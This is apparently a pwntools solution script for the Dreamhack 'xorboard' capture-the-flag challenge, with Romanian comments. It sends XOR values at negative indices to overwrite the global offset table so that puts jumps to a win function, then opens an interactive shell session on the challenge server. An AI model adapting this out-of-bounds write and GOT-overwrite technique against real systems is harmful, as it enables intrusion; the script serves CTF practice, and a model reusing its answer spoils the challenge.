from pwn import *
elf = ELF('/home/kali/Downloads/dreamhack/xorboard/deploy/main')

context.arch = 'amd64'
cyberedu = 'host3.dreamhack.games:19057'

ip, port = cyberedu.split(':')
port = int(port)

if args.REMOTE:
    p = remote(ip, port)
else:
    p = elf.process()
    
#print(elf.got)

def enter_value(x, y): 
    p.recvuntil(b"> ")
    p.sendline(b"1")
    
    p.recvuntil(b"> ")
    p.sendline(x)
    p.sendline(y)
    
enter_value(b"0", b"2") # 0x1 ^ 0x4
enter_value(b"0", b"3") #0x5 ^ 0x8
enter_value(b"0", b"9") #0xd ^ 0x200
enter_value(b"0", b"-86") #0x20d ^ 0x5555555551e0

enter_value(b"-1", b"-19")
enter_value(b"-1", b"0")

#punem in puts win
enter_value(b"-19", b"-1")

#aleluia o mers!!!!!

p.interactive()
